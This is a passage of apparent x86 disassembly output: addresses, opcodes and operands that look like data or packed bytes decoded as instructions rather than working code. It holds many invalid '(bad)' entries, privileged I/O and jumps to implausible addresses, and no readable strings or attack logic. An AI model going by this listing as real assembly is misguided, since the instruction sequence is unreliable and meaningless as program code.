  4046fe:	mov    edx,0x8fe0346f
  404703:	test   DWORD PTR [edx],0xc1872a97
  404709:	das    
  40470a:	or     esi,eax
  40470c:	jle    0x4046c3
  40470e:	or     BYTE PTR [ebp+0x1947ceb9],cl
  404714:	sbb    edi,DWORD PTR [esi-0x34]
  404717:	mov    ds:0x751f2e85,eax
  40471c:	aad    0x0
  40471e:	sub    ebx,esi
  404720:	loopne 0x40471c
  404722:	xor    BYTE PTR [eax+ecx*2],0x26
  404726:	cmp    BYTE PTR [ecx],ch
  404728:	ja     0x404760
  40472a:	mov    eax,0x86cb7f3f
  40472f:	push   0xffffffdb
  404731:	dec    esi
  404732:	dec    edx
  404733:	ja     0x404761
  404735:	inc    ebp
  404736:	mov    ebp,0x14f144b7
  40473b:	inc    esi
  40473c:	and    bl,dl
  40473e:	mov    bl,0x29
  404740:	mov    al,ds:0xfae1a074
  404745:	sar    ebp,cl
  404747:	cld    
  404748:	mov    WORD PTR [edi],es
  40474a:	stc    
  40474b:	or     al,0xda
  40474d:	addr16 inc edx
  40474f:	cmp    al,0x2c
  404751:	adc    al,0xdb
  404753:	mov    ah,0x79
  404755:	test   al,0xde
  404757:	sar    BYTE PTR [ebx+0x290b1460],cl
  40475d:	sbb    BYTE PTR [eax+0x56ff7ab8],ah
  404763:	dec    edx
  404764:	popf   
  404765:	add    edx,esi
  404767:	test   al,0x62
  404769:	adc    bl,BYTE PTR [esi]
  40476b:	push   dx
  40476d:	repz mov ds:0xd21df4b5,eax
  404773:	mov    ah,0x55
  404775:	xor    esi,esi
  404777:	push   edi
  404778:	test   DWORD PTR [ebx-0x3ec75122],esp
  40477e:	sub    eax,0xfc7d6d93
  404783:	(bad)  
  404784:	jl     0x404738
  404786:	add    eax,0x83827879
  40478b:	push   0x5b
  40478d:	sub    bh,BYTE PTR [edx]
  40478f:	dec    edi
  404790:	leave  
  404791:	sbb    ch,BYTE PTR [eax+0x4e]
  404794:	pop    edi
  404795:	loope  0x40479d
  404797:	mov    esi,0x8f6449a4
  40479c:	test   al,0x28
  40479e:	dec    edi
  40479f:	dec    ebx
  4047a0:	pop    es
  4047a1:	jbe    0x404781
  4047a3:	add    cl,BYTE PTR [edi]
  4047a5:	or     dl,BYTE PTR [esp+eax*2+0x6cbd05a3]
  4047ac:	std    
  4047ad:	popf   
  4047ae:	and    al,0x51
  4047b0:	bound  eax,QWORD PTR [edx+ebx*1-0x13]
  4047b4:	push   edx
  4047b5:	lock out dx,eax
  4047b7:	mov    bl,0xbb
  4047b9:	loope  0x404797
  4047bb:	shl    BYTE PTR [esp+eiz*4-0x5c6c8097],0x4d
  4047c3:	popa   
  4047c4:	pop    esi
  4047c5:	lahf   
  4047c6:	(bad)  
  4047c7:	mov    edi,0xf521bb32
  4047cc:	lock xchg DWORD PTR [esi+0x75],esp
  4047d0:	test   BYTE PTR [edx+0x64d6e259],dh
  4047d6:	jns    0x4047d5
  4047d8:	fsubrp st(3),st
  4047da:	rcl    DWORD PTR [esi],cl
  4047dc:	and    al,0x9e
  4047de:	sbb    al,0xfa
  4047e0:	lods   eax,DWORD PTR ds:[esi]
  4047e1:	xchg   esi,eax
  4047e2:	xlat   BYTE PTR ds:[ebx]
  4047e3:	add    eax,ebx
  4047e5:	lods   al,BYTE PTR ds:[esi]
  4047e6:	dec    ecx
  4047e7:	dec    ebx
  4047e8:	icebp  
  4047e9:	or     BYTE PTR [edi-0xb],bl
  4047ec:	mov    DWORD PTR [eax],eax
  4047ee:	out    dx,eax
  4047ef:	int3   
  4047f0:	retf   0xd8a4
  4047f3:	gs ins DWORD PTR es:[edi],dx
  4047f5:	push   esp
  4047f6:	or     esp,edx
  4047f8:	dec    esi
  4047f9:	jg     0x40479d
  4047fb:	mov    ah,0x31
  4047fd:	mov    dl,0xe2
  4047ff:	idiv   DWORD PTR [edx+0x66dcdbb1]
  404805:	clc    
  404806:	cli    
  404807:	fst    QWORD PTR [ebp-0x77]
  40480a:	xor    eax,0xa34dbb81
  40480f:	dec    edx
  404810:	hlt    
  404811:	fnstcw WORD PTR [eax]
  404813:	mov    dh,0x72
  404815:	aas    
  404816:	ret    
  404817:	add    DWORD PTR [eax+0x4781260e],ebp
  40481d:	xchg   ecx,eax
  40481e:	mov    ebp,0x7a365a0f
  404823:	mov    cl,0x71
  404825:	jp     0x404857
  404827:	scas   al,BYTE PTR es:[edi]
  404828:	imul   ebx,DWORD PTR [edi+0x6931d48d],0xeed3084b
  404832:	jmp    0xd596:0xb1c7a600
  404839:	dec    edx
  40483a:	aad    0x11
  40483c:	loopne 0x4047d9
  40483e:	call   0xdaa3981c
  404843:	pop    edx
  404844:	pop    ds
  404845:	or     BYTE PTR [edx-0x19a3932a],cl
  40484b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40484c:	pop    edx
  40484d:	jno    0x404857
  40484f:	push   ebp
  404850:	jp     0x4047dd
  404852:	mov    bh,0xde
  404854:	push   0x97f78c0c
  404859:	sbb    DWORD PTR [ecx],0x46935dea
  40485f:	sbb    al,0xf4
  404861:	push   cs
  404862:	sahf   
  404863:	push   0xdbfef77d
  404868:	mov    al,0x47
  40486a:	fs mov dl,0x7b
  40486d:	popf   
  40486e:	mov    ss,ebx
  404870:	in     al,0xa9
  404872:	outs   dx,DWORD PTR ds:[esi]
  404873:	adc    al,0x6a
  404875:	je     0x4047fc
  404877:	pop    ebp
  404878:	out    dx,eax
  404879:	pop    ecx
  40487a:	or     esp,DWORD PTR [edx-0x7c]
  40487d:	cwde   
  40487e:	xlat   BYTE PTR ds:[ebx]
  40487f:	cmp    al,0x4a
  404881:	add    eax,0x7cce29d2
  404886:	hlt    
  404887:	inc    eax
  404888:	js     0x4048a3
  40488a:	mov    edx,0x685dc908
  40488f:	xchg   ebp,eax
  404890:	sub    ch,BYTE PTR [ebx-0x6]
  404893:	icebp  
  404894:	mov    bh,0xb4
  404896:	fst    QWORD PTR [eax-0x46]
  404899:	push   es
  40489a:	mov    cl,BYTE PTR [eax-0x6a]
  40489d:	ret    
  40489e:	fsubr  DWORD PTR [edi]
  4048a0:	pop    eax
  4048a1:	jge    0x404834
  4048a3:	lods   eax,DWORD PTR ds:[esi]
  4048a4:	bound  ecx,QWORD PTR [edx+0x224520cc]
  4048aa:	into   
  4048ab:	add    BYTE PTR [ebx+eax*2],0x14
  4048af:	pusha  
  4048b0:	pop    edx
  4048b1:	sub    edx,DWORD PTR [ebx]
  4048b3:	ror    esi,0xc9
  4048b6:	repnz add edx,DWORD PTR [edx+edx*4-0xfb220a4]
  4048be:	mov    ds:0x5cff69db,al
  4048c3:	inc    edx
  4048c4:	inc    ebp
  4048c5:	ins    DWORD PTR es:[edi],dx
  4048c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048c7:	push   esi
  4048c8:	lea    ebp,[edx-0x4ea9f6b6]
  4048ce:	(bad)  
  4048d0:	dec    edx
  4048d1:	dec    ebp
  4048d2:	jg     0x4048ad
  4048d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048d5:	and    edx,esi
  4048d7:	cmp    eax,0x8a05261b
  4048dc:	push   eax
  4048dd:	lahf   
  4048de:	mov    BYTE PTR [eax+0x40c6398e],al
  4048e4:	fldcw  WORD PTR [edi+edx*2+0x3cc8c32c]
  4048eb:	dec    eax
  4048ec:	hlt    
  4048ed:	addr16 popa 
  4048ef:	add    eax,0x96d4cefa
  4048f4:	push   cs
  4048f5:	mov    ds:0x3d4e5eb9,eax
  4048fa:	test   al,0xd5
  4048fc:	in     eax,0xf3
  4048fe:	pop    ecx
  4048ff:	popf   
  404900:	sub    al,0xe1
  404902:	fidiv  DWORD PTR [ecx]
  404904:	hlt    
  404905:	mov    esi,0x9c851916
  40490a:	jmp    0x40496a
  40490c:	push   edi
  40490d:	mov    ecx,DWORD PTR [ebp+0x56]
  404910:	popa   
  404911:	ret    
  404912:	add    eax,0xb966f9e4
  404917:	push   edx
  404918:	sub    dh,dh
  40491a:	cwde   
  40491b:	repz test BYTE PTR [edi],ch
  40491e:	push   ebx
  40491f:	outs   dx,DWORD PTR ds:[esi]
  404920:	pushf  
  404921:	repz sbb eax,DWORD PTR [edi+0x42]
  404925:	sub    DWORD PTR [ebp+0x7f],ecx
  404928:	push   esi
  404929:	popa   
  40492a:	push   0x54715b2d
  40492f:	add    al,0x6a
  404931:	sbb    ebx,DWORD PTR [ebx+0x64819ca2]
  404937:	ins    BYTE PTR es:[edi],dx
  404938:	jne    0x40490a
  40493a:	mov    ecx,0xb585b329
  40493f:	shr    DWORD PTR [ecx],0x29
  404942:	sbb    eax,0x8acb21c0
  404947:	in     al,dx
  404948:	jb     0x4049b5
  40494a:	pop    ebp
  40494b:	jmp    0x99687ee7
  404950:	sahf   
  404951:	or     eax,esi
  404953:	push   esp
  404954:	mov    ebp,0x94eb7b93
  404959:	jo     0x4049a5
  40495b:	mov    ebp,DWORD PTR [ecx+0x67]
  40495e:	stc    
  40495f:	je     0x4049a5
  404961:	mov    dl,0x7f
  404963:	jns    0x404965
  404965:	sti    
  404966:	ins    BYTE PTR es:[edi],dx
  404967:	adc    eax,0x7565d0eb
  40496c:	cmp    al,cl
  40496e:	mov    eax,ds:0x715d8f99
  404973:	leave  
  404974:	mov    dl,0x5
  404976:	mov    ch,0x92
  404978:	into   
  404979:	pusha  
  40497a:	in     al,dx
  40497b:	fsub   DWORD PTR [eax+0xf]
  40497e:	inc    ecx
  40497f:	(bad)  
  404981:	int    0xb1
  404983:	scas   eax,DWORD PTR es:[edi]
  404984:	push   esi
  404985:	outs   dx,BYTE PTR ds:[esi]
  404986:	(bad)  
  404987:	out    0x56,al
  404989:	sbb    BYTE PTR [eax-0x54],ch
  40498c:	xlat   BYTE PTR ds:[ebx]
  40498e:	scas   eax,DWORD PTR es:[edi]
  40498f:	not    DWORD PTR [ecx-0x6]
  404992:	ds inc esp
  404994:	scas   eax,DWORD PTR es:[edi]
  404995:	aaa    
  404996:	jge    0x40496b
  404998:	lods   eax,DWORD PTR ds:[esi]
  404999:	mov    WORD PTR [esi],?
  40499b:	sub    eax,0xcfd8f7fa
  4049a0:	mov    dl,BYTE PTR [esi+0x79]
  4049a3:	pop    ds
  4049a4:	test   esp,ebx
  4049a6:	pop    ebp
  4049a7:	loop   0x4049a7
  4049a9:	dec    edi
  4049aa:	sbb    ch,BYTE PTR [edx]
  4049ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049ad:	das    
  4049ae:	push   eax
  4049af:	add    ah,ah
  4049b1:	scas   al,BYTE PTR es:[edi]
  4049b2:	mov    edx,0xe0c7e680
  4049b7:	fild   DWORD PTR [edx+0x39]
  4049ba:	xchg   ecx,eax
  4049bb:	xor    esp,ecx
  4049bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049be:	pop    eax
  4049bf:	and    DWORD PTR [eax+edx*4+0x612a5c96],esp
  4049c6:	fidivr DWORD PTR [edi]
  4049c8:	popa   
  4049c9:	int    0x89
  4049cb:	sbb    eax,0x1926b34d
  4049d0:	mov    edi,0x55235806
  4049d5:	cmp    DWORD PTR [ecx],edx
  4049d7:	ror    BYTE PTR [ebx+0xc],1
  4049da:	lock fmul st,st(0)
  4049dd:	inc    esp
  4049de:	fcom   DWORD PTR [esi+0x23]
  4049e1:	sahf   
  4049e2:	dec    ecx
  4049e3:	dec    ebx
  4049e4:	dec    ebp
  4049e5:	add    al,BYTE PTR [eax+edx*2-0x50854fb1]
  4049ec:	stos   DWORD PTR es:[edi],eax
  4049ed:	bound  edx,QWORD PTR [edx+0x452e24ea]
  4049f3:	aam    0xc2
  4049f5:	push   esp
  4049f6:	add    eax,0x9ead93f2
  4049fb:	adc    esp,ecx
  4049fd:	sti    
  4049fe:	pusha  
  4049ff:	sbb    dl,ah
  404a01:	sbb    al,0x53
  404a03:	out    0x3a,al
  404a05:	add    bl,BYTE PTR [ebx]
  404a07:	ss xchg ebx,eax
  404a09:	lds    edx,FWORD PTR [edx+eax*1+0x76]
  404a0d:	adc    al,0x56
  404a0f:	cmp    DWORD PTR [ecx-0xf6bc61f],edx
  404a15:	mov    esi,0xfbaa6b5a
  404a1a:	rcl    BYTE PTR [ecx],0x38
  404a1d:	(bad)  
  404a1e:	loopne 0x404a03
  404a20:	out    0x9f,eax
  404a22:	into   
  404a23:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a25:	(bad)  
  404a26:	fisubr DWORD PTR [edi+0x6e]
  404a29:	jae    0x404a2c
  404a2b:	scas   al,BYTE PTR es:[edi]
  404a2c:	xor    eax,0x884d3188
  404a31:	dec    esi
  404a32:	push   ebp
  404a33:	jns    0x404a24
  404a35:	mov    edi,DWORD PTR [ebp-0x3]
  404a38:	adc    eax,0x687746a3
  404a3d:	and    eax,0xc7a0f776
  404a42:	and    dh,0x20
  404a45:	sbb    ebx,DWORD PTR [edx+0x15]
  404a48:	mov    ebx,0xa205d694
  404a4d:	fsub   DWORD PTR [ecx-0x27]
  404a50:	(bad)  
  404a51:	sub    eax,0x8284833b
  404a56:	pushf  
  404a57:	cs mov ch,0x81
  404a5a:	jp     0x404a88
  404a5c:	dec    esi
  404a5d:	cmp    edx,ecx
  404a5f:	lods   al,BYTE PTR ds:[esi]
  404a60:	imul   esp,DWORD PTR [eax-0x44f817c8],0xffffffcb
  404a67:	shr    BYTE PTR [eax-0x717cd63f],0xc2
  404a6e:	rcl    BYTE PTR [ebx],cl
  404a70:	in     eax,dx
  404a71:	xchg   edx,eax
  404a72:	dec    edi
  404a73:	pop    ebx
  404a74:	sub    BYTE PTR [esi+0x7],al
  404a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a78:	pop    esi
  404a79:	arpl   WORD PTR [ebx+0x1399876c],si
  404a7f:	fdivp  st(3),st
  404a81:	int    0x5a
  404a83:	jecxz  0x404a41
  404a85:	dec    edx
  404a86:	je     0x404a19
  404a88:	pop    edi
  404a89:	call   0x574d:0xb856eb5f
  404a90:	mov    ch,0x97
  404a92:	out    0x45,eax
  404a94:	inc    ebx
  404a95:	or     ebp,DWORD PTR ds:0x68a05c68
  404a9b:	stos   DWORD PTR es:[edi],eax
  404a9c:	mov    WORD PTR [eax-0x4],?
  404a9f:	das    
  404aa0:	into   
  404aa1:	outs   dx,DWORD PTR ds:[esi]
  404aa2:	inc    ebx
  404aa3:	mov    esp,0x7c214cfb
  404aa8:	xchg   BYTE PTR [esi-0x28],ah
  404aab:	popa   
  404aac:	ret    
  404aad:	jo     0x404a3d
  404aaf:	les    ebx,FWORD PTR [esi]
  404ab1:	cmp    DWORD PTR [edi-0xe],edi
  404ab4:	pop    edx
  404ab5:	loope  0x404ac1
  404ab7:	cld    
  404ab8:	pop    esi
  404ab9:	fsubr  DWORD PTR [ebp-0x45]
  404abc:	jno    0x404af5
  404abe:	out    0x29,al
  404ac0:	sbb    BYTE PTR [ebx+0x38e769d3],bh
  404ac6:	push   ds
  404ac7:	shl    BYTE PTR [edi-0x10],1
  404aca:	sbb    BYTE PTR ss:[esi-0x4d2ffa87],ah
  404ad1:	test   eax,0xb237e2f3
  404ad6:	rol    BYTE PTR [ebp-0x52],cl
  404ad9:	mov    edi,0x97e25f32
  404ade:	inc    esi
  404adf:	mov    ebx,0x4f307efb
  404ae4:	ins    DWORD PTR es:[edi],dx
  404ae5:	rcl    DWORD PTR [edi+0x786c03b1],cl
  404aeb:	mov    fs,WORD PTR [ecx+0x6b0ffd2c]
  404af1:	lds    ebx,FWORD PTR [edx-0x17]
  404af4:	stc    
  404af5:	mov    bl,0x54
  404af7:	xchg   BYTE PTR [eax+0x7797c194],ch
  404afd:	out    dx,al
  404afe:	into   
  404aff:	xchg   esi,eax
  404b00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b01:	imul   eax,DWORD PTR [eax+0x3ad96d],0xffffff95
  404b08:	jbe    0x404ab4
  404b0a:	into   
  404b0b:	add    BYTE PTR [edx+ecx*2],dl
  404b0e:	xchg   esi,eax
  404b0f:	sbb    ebp,edx
  404b11:	retf   
  404b12:	cmp    eax,0x8bdebeef
  404b17:	xchg   ecx,eax
  404b18:	and    eax,DWORD PTR [edi*4+0x173c5261]
  404b1f:	adc    DWORD PTR [ecx],esi
  404b21:	mov    ah,0x57
  404b23:	popf   
  404b24:	(bad)  
  404b26:	xchg   esi,eax
  404b27:	(bad)  
  404b2a:	ins    BYTE PTR es:[edi],dx
  404b2b:	mul    BYTE PTR [edi+0x1c9f170b]
  404b31:	mov    WORD PTR [edx-0x73fcebb],es
  404b37:	or     eax,0x766abb44
  404b3c:	jmp    0x404b51
  404b3e:	jnp    0x404b71
  404b40:	repnz pop ecx
  404b42:	mov    eax,0xa057cc1d
  404b47:	push   edx
  404b48:	push   esi
  404b49:	int3   
  404b4a:	pandn  mm2,QWORD PTR [ebx]
  404b4d:	je     0x404b83
  404b4f:	mov    BYTE PTR [esi-0xdd5133c],ah
  404b55:	dec    edx
  404b56:	add    DWORD PTR [esi-0x2e8081bb],edi
  404b5c:	ficomp DWORD PTR [edi+esi*1]
  404b5f:	cli    
  404b60:	outs   dx,DWORD PTR ds:[esi]
  404b61:	sub    BYTE PTR [eax],ch
  404b63:	push   cs
  404b64:	mov    WORD PTR [ecx+0x3e],cs
  404b67:	js     0x404baf
  404b69:	iret   
  404b6a:	fild   WORD PTR [esp+ebx*4]
  404b6d:	inc    edx
  404b6e:	jmp    0x2e8cb2a
  404b73:	xchg   esi,eax
  404b74:	jnp    0x404b35
  404b76:	into   
  404b77:	adc    al,0xcc
  404b79:	mov    al,ds:0x12a0db35
  404b7e:	jb     0x404b84
  404b80:	js     0x404bda
  404b82:	mov    dh,0xb1
  404b84:	ins    BYTE PTR es:[edi],dx
  404b85:	cdq    
  404b86:	adc    eax,0x2a368d8e
  404b8b:	mov    cl,0x4a
  404b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b8e:	sub    edx,ebp
  404b90:	sbb    al,0x5f
  404b92:	pop    esp
  404b93:	xchg   DWORD PTR [esi+0x1870dc40],ebx
  404b99:	push   ebp
  404b9a:	inc    edx
  404b9b:	pop    es
  404b9c:	cmova  edi,DWORD PTR [edx]
  404b9f:	clc    
  404ba0:	cmp    eax,DWORD PTR [ecx-0x7ee7f8d4]
  404ba6:	and    eax,0xd7e61e48
  404bab:	cmp    edx,esi
  404bad:	test   al,0x83
  404baf:	rol    DWORD PTR [eax-0x1f],1
  404bb2:	push   ecx
  404bb3:	sub    DWORD PTR [eax+0x2d06a950],0x11
  404bba:	xchg   edx,eax
  404bbb:	jp     0x404b7c
  404bbd:	jne    0x404bf5
  404bbf:	retf   
  404bc0:	stc    
  404bc1:	test   al,0xbe
  404bc3:	in     eax,dx
  404bc4:	popf   
  404bc5:	sahf   
  404bc6:	jnp    0x404b90
  404bc8:	inc    edx
  404bc9:	test   ch,dl
  404bcb:	aas    
  404bcc:	hlt    
  404bcd:	lods   al,BYTE PTR ds:[esi]
  404bce:	loop   0x404bda
  404bd0:	rcr    dl,0xa6
  404bd3:	cdq    
  404bd4:	stos   BYTE PTR es:[edi],al
  404bd5:	add    eax,0xaae3554a
  404bda:	sbb    al,al
  404bdc:	cld    
  404bdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bde:	test   BYTE PTR [ebx+0x6d0da7df],al
  404be4:	ins    DWORD PTR es:[edi],dx
  404be5:	lock lahf 
  404be7:	sub    ch,bl
  404be9:	mov    ebp,0xc88da65
  404bee:	xor    al,0x5f
  404bf0:	mov    al,0xec
  404bf2:	sbb    BYTE PTR [eax+0xf],0x97
  404bf6:	in     eax,dx
  404bf7:	scas   al,BYTE PTR es:[edi]
  404bf8:	xchg   ecx,eax
  404bf9:	mov    ebp,0x96a7be05
  404bfe:	fwait
  404bff:	add    DWORD PTR [ebx],esi
  404c01:	mov    al,0x82
  404c03:	add    ch,BYTE PTR [esi]
  404c05:	out    0x38,eax
  404c07:	pop    ebp
  404c08:	push   0x3b
  404c0a:	lods   al,BYTE PTR ds:[esi]
  404c0b:	xlat   BYTE PTR ds:[ebx]
  404c0c:	adc    al,0xf5
  404c0e:	cmp    esi,DWORD PTR [ebp-0x38cdba74]
  404c14:	inc    ebx
  404c15:	mov    bl,dh
  404c17:	sub    bl,cl
  404c19:	push   ss
  404c1a:	adc    DWORD PTR [edi+0x4e49dbe8],ecx
  404c20:	sbb    DWORD PTR [edx-0xe02f6d1],esp
  404c26:	mov    bl,0x17
  404c28:	pushf  
  404c29:	mov    ecx,0xc452c8d9
  404c2e:	pusha  
  404c2f:	adc    ebx,DWORD PTR [ebx+0x12]
  404c32:	imul   esp,ecx,0x7cd40b02
  404c38:	push   0x2d281d2c
  404c3d:	cmp    eax,0x8252f5ca
  404c42:	fild   QWORD PTR [ebx]
  404c44:	inc    eax
  404c45:	rcr    DWORD PTR [ebx-0x512a26a0],cl
  404c4b:	aas    
  404c4c:	jle    0x404bfe
  404c4e:	imul   edi,DWORD PTR [ecx+0x45],0xb0417d0c
  404c55:	push   0xc0fee222
  404c5a:	and    al,0xc5
  404c5c:	fwait
  404c5d:	out    dx,al
  404c5e:	push   esp
  404c5f:	out    0x6e,eax
  404c61:	fs and ah,cl
  404c64:	jg     0x404c76
  404c66:	out    dx,eax
  404c67:	jbe    0x404bfa
  404c69:	pop    ebx
  404c6a:	cdq    
  404c6b:	in     eax,0x15
  404c6d:	mov    edi,0xbb641cc0
  404c72:	jno    0x404bf7
  404c74:	out    0xcc,al
  404c76:	icebp  
  404c77:	jb     0x404c56
  404c79:	inc    esp
  404c7a:	xlat   BYTE PTR ds:[ebx]
  404c7b:	push   edi
  404c7c:	and    edx,DWORD PTR ds:0xf57687b0
  404c82:	and    al,0x3d
  404c84:	(bad)  
  404c85:	pop    ecx
  404c86:	xchg   BYTE PTR es:[ebx+0x288dc8ee],ch
  404c8d:	loopne 0x404cda
  404c8f:	jl     0x404cd8
  404c91:	loopne 0x404c7f
  404c93:	jae    0x404c71
  404c95:	pop    ebp
  404c96:	out    dx,eax
  404c97:	mov    WORD PTR [ebp-0x4d],fs
  404c9a:	dec    esp
  404c9b:	in     eax,0x5d
  404c9d:	cmc    
  404c9e:	pushf  
  404c9f:	cmc    
  404ca0:	jmp    0x404cb9
  404ca2:	nop
  404ca3:	mov    DWORD PTR [esi+eiz*4-0x6c5ddba7],edi
  404caa:	xchg   esp,eax
  404cab:	in     al,0xf3
  404cad:	pop    ebp
  404cae:	lock cmp al,0x20
  404cb1:	jno    0x404c4c
  404cb3:	xor    edi,DWORD PTR [ecx-0x2]
  404cb6:	jecxz  0x404d16
  404cb8:	xchg   esi,eax
  404cb9:	ins    DWORD PTR es:[edi],dx
  404cba:	addr16 and edx,esp
  404cbd:	stos   DWORD PTR es:[edi],eax
  404cbe:	pop    esp
  404cbf:	mov    dl,0x15
  404cc1:	pushf  
  404cc2:	mov    bl,0xff
  404cc4:	pop    eax
  404cc5:	aam    0x97
  404cc7:	stos   DWORD PTR es:[edi],eax
  404cc8:	int    0x19
  404cca:	xchg   ebx,eax
  404ccb:	inc    esi
  404ccc:	jmp    0xc826:0xeaaad6da
  404cd3:	imul   edi,DWORD PTR [ecx],0x8783f9a9
  404cd9:	sbb    dh,bh
  404cdb:	add    cl,BYTE PTR [edi-0x4486a76d]
  404ce1:	cmp    ah,BYTE PTR [edi]
  404ce3:	nop
  404ce4:	push   es
  404ce5:	(bad)  
  404ce6:	pop    ds
  404ce7:	outs   dx,BYTE PTR ds:[esi]
  404ce8:	lea    esi,[edi+0x1ab97e79]
  404cee:	mov    edx,0xdcbd2c22
  404cf3:	dec    ecx
  404cf4:	out    dx,eax
  404cf5:	std    
  404cf6:	neg    DWORD PTR [eax+0x4a04a334]
  404cfc:	sbb    DWORD PTR [ebx-0x9],esp
  404cff:	dec    eax
  404d00:	pusha  
  404d01:	imul   ebx,DWORD PTR [ecx-0x66a6210f],0x4d226fa1
  404d0b:	(bad)  
  404d0c:	cli    
  404d0d:	mov    dh,0xa4
  404d0f:	scas   al,BYTE PTR es:[edi]
  404d10:	leave  
  404d11:	jge    0x404d1b
  404d13:	mul    BYTE PTR [edx-0x4d]
  404d16:	jmp    0xec124c42
  404d1b:	sub    BYTE PTR [edi],0x1e
  404d1e:	out    dx,eax
  404d1f:	xor    esi,ecx
  404d21:	out    0x2f,eax
  404d23:	cmp    BYTE PTR [edx],bh
  404d25:	test   al,0xcd
  404d27:	das    
  404d28:	ret    0x789
  404d2b:	cld    
  404d2c:	pop    esi
  404d2d:	nop
  404d2e:	cdq    
  404d2f:	arpl   WORD PTR [eax+0x2],di
  404d32:	imul   esi,DWORD PTR [ebx-0x2f16570f],0x2837f2d8
  404d3c:	mov    bl,0x84
  404d3e:	push   eax
  404d3f:	gs inc esp
  404d41:	jl     0x404d94
  404d43:	pushf  
  404d44:	push   edi
  404d45:	popa   
  404d46:	jg     0x404d48
  404d48:	outs   dx,BYTE PTR ds:[esi]
  404d49:	push   eax
  404d4a:	xchg   BYTE PTR [edi+ecx*2],ah
  404d4d:	lock arpl WORD PTR [ebp+0xc145fdc],si
  404d54:	fidiv  WORD PTR [edi+0x936a648]
  404d5a:	fdivr  DWORD PTR [ebp+0x24c5c25a]
  404d60:	mov    ch,0xaa
  404d62:	adc    BYTE PTR [ebx+0xb],cl
  404d65:	fwait
  404d66:	cmp    BYTE PTR [eax+0x36ebf7af],0xcd
  404d6d:	xor    DWORD PTR [ebp+0xe],eax
  404d70:	sahf   
  404d71:	(bad)  
  404d72:	sti    
  404d73:	jbe    0x404d0b
  404d75:	pop    es
  404d76:	in     eax,0x5e
  404d78:	pop    ebp
  404d79:	mov    eax,DWORD PTR [eax+0x76957a9e]
  404d7f:	dec    ebp
  404d80:	jmp    0x2e08574b
  404d85:	imul   edi,DWORD PTR [ebp+0x11],0xb
  404d89:	out    0x8f,eax
  404d8b:	push   edi
  404d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d8d:	push   esi
  404d8e:	pushf  
  404d8f:	leave  
  404d90:	pop    edi
  404d91:	std    
  404d92:	pop    ds
  404d93:	mov    ecx,0xb6b2b838
  404d98:	lock mov dl,0x50
  404d9b:	cs and bl,cl
  404d9e:	lahf   
  404d9f:	loope  0x404dd5
  404da1:	repz clc 
  404da3:	push   0xfb30e9df
  404da8:	and    BYTE PTR ss:[edx-0x78],0x2a
  404dad:	jp     0x404ddb
  404daf:	ret    0x7a31
  404db2:	push   0x1566c78b
  404db7:	pusha  
  404db8:	mov    edx,es
  404dba:	popf   
  404dbb:	jb     0x404dcc
  404dbd:	aam    0xf
  404dbf:	loop   0x404e14
  404dc1:	push   0xce66d5d2
  404dc6:	add    DWORD PTR [esi],edx
  404dc8:	pop    edx
  404dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dca:	jge    0x404e3e
  404dcc:	push   edi
  404dcd:	xchg   esp,esi
  404dcf:	mov    BYTE PTR [eax],dl
  404dd1:	inc    edi
  404dd2:	mov    WORD PTR [ecx-0x50],cs
  404dd5:	daa    
  404dd6:	popa   
  404dd7:	outs   dx,DWORD PTR ds:[esi]
  404dd8:	mov    eax,ds:0x9b4672a5
  404ddd:	ror    BYTE PTR [edx+0x45595a25],cl
  404de3:	and    ebp,DWORD PTR [ecx+0x79]
  404de6:	pusha  
  404de7:	mov    ebp,ebp
  404de9:	pop    es
  404dea:	ret    
  404deb:	inc    edx
  404dec:	in     al,dx
  404ded:	fnstenv [esi+eiz*2]
  404df0:	pop    ss
  404df1:	mov    ?,WORD PTR [esi]
  404df3:	stos   DWORD PTR es:[edi],eax
  404df4:	mov    eax,0x1a702d2b
  404df9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dfa:	cmp    al,bh
  404dfc:	ins    BYTE PTR es:[edi],dx
  404dfd:	pop    eax
  404dfe:	jmp    0xd2d3:0xd1988638
  404e05:	add    eax,0x4ff76e47
  404e0a:	sbb    BYTE PTR [ebp+0x51],0x69
  404e0e:	test   al,0xc6
  404e10:	dec    ebx
  404e11:	dec    edx
  404e12:	pop    ds
  404e13:	xchg   esp,eax
  404e14:	aam    0x9a
  404e16:	jno    0x404e53
  404e18:	cmp    dl,bh
  404e1a:	jne    0x404de4
  404e1c:	pop    ebx
  404e1d:	add    edx,ecx
  404e1f:	mov    eax,ds:0x4f7eb37f
  404e24:	shl    DWORD PTR [esi-0x7e],0xd1
  404e28:	fistp  DWORD PTR [ebx+0x9c95fff]
  404e2e:	sbb    dh,cl
  404e30:	push   eax
  404e31:	aam    0xae
  404e33:	sub    DWORD PTR [edi],eax
  404e35:	cmp    al,0x45
  404e37:	xor    BYTE PTR [edx+edx*2],dh
  404e3a:	mov    ebp,0xc87e828b
  404e3f:	mov    eax,ds:0x9627e7dc
  404e44:	addr16 mov eax,0xadc988df
  404e4a:	add    DWORD PTR [ebx-0x335b95fe],edx
  404e50:	pop    ds
  404e51:	mov    al,0x39
  404e53:	inc    edx
  404e54:	adc    cl,dh
  404e56:	arpl   WORD PTR [ecx],bp
  404e58:	push   ebp
  404e59:	cmc    
  404e5a:	je     0x404e93
  404e5c:	dec    edx
  404e5d:	in     eax,0x55
  404e5f:	push   esi
  404e60:	adc    eax,0x6d513d
  404e65:	xchg   esp,eax
  404e66:	add    ebp,esp
  404e68:	jle    0x404e02
  404e6a:	fadd   DWORD PTR [esi]
  404e6c:	xchg   ecx,eax
  404e6d:	xchg   DWORD PTR [edx+0x30],ebx
  404e70:	les    eax,FWORD PTR [ebp-0x1c]
  404e73:	dec    eax
  404e74:	jge    0x404e56
  404e76:	push   ss
  404e77:	sbb    DWORD PTR [ecx-0x43],esi
  404e7a:	into   
